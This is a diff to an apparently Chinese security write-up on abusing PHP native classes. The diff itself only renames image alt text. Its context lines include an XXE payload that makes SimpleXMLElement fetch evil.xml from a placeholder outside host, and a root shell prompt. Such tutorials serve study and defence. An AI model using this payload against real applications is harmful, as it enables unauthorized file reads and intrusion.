@@ -394,7 +394,7 @@ foreach($dir as $a){
 
 当然这仅仅只是Demo深入其中我们查询官方文档，可以看到其中也是有很多方法，但是我们注重看我们使用的这个
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 也就是说其实我们是调用了其中的`__toString()`,所以正经的写法是这样子
 
@@ -650,7 +650,7 @@ root@dkcjbRCL8kgaNGz:/etc#
 $x=new SimpleXMLElement("http://xxx.xxx.xxx.xxx/evil.xml",2,true);
 ```
 
-![2](./assets/002.png)
+![image](./assets/002.png)
 
 当确定为`true`时，会当成`xml`文档解析,这不就典型`xxe`了嘛，所以只要`xxe`,能打的都能打
 
